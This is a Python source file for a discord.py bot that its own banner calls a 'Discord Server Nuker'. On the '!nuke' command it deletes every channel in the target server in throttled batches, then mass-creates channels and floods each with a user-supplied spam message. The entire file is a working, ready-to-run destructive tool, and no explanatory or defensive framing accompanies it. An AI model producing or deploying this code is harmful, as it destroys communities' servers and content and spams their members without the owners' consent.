# language: Python, file: optimized_nuker.py, target: Python 3.10+, discord.py
import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

config = {
    "count": 0,
    "name": "",
    "message": ""
}

@bot.event
async def on_ready():
    print(f"[*] Logged in as {bot.user} (ID: {bot.user.id})")
    print(f"[*] Configured -> Channels: {config['count']} | Name: {config['name']} | Message: {config['message']}")
    print("[*] Go to any channel in the target server and type '!nuke' to execute.")

@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild
    print(f"[*] Execution triggered in guild: {guild.name}")
    
  
    channels = guild.channels
    chunk_size = 10
    for i in range(0, len(channels), chunk_size):
        chunk = channels[i:i + chunk_size]
        delete_tasks = [ch.delete() for ch in chunk]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        await asyncio.sleep(0.15)

  
    semaphore = asyncio.Semaphore(8)

    async def spawn_channel(i):
        async with semaphore:
            try:
                ch = await guild.create_text_channel(f"{config['name']}-{i}")
                await ch.send(config['message'])
            except Exception:
                pass

    create_tasks = [spawn_channel(i) for i in range(1, config['count'] + 1)]
    await asyncio.gather(*create_tasks, return_exceptions=True)
    print("[+] Nuke sequence completed.")

if __name__ == "__main__":
    print("=== Discord Server Nuker Setup ===")
    print("=== created by phoenix===\n")
    config['count'] = int(input("Enter number of channels to create: ").strip())
    config['name'] = input("Enter channel name: ").strip()
    config['message'] = input("Enter spam message: ").strip()
    
    TOKEN = input("Enter Discord Bot Token: ").strip()
    bot.run(TOKEN)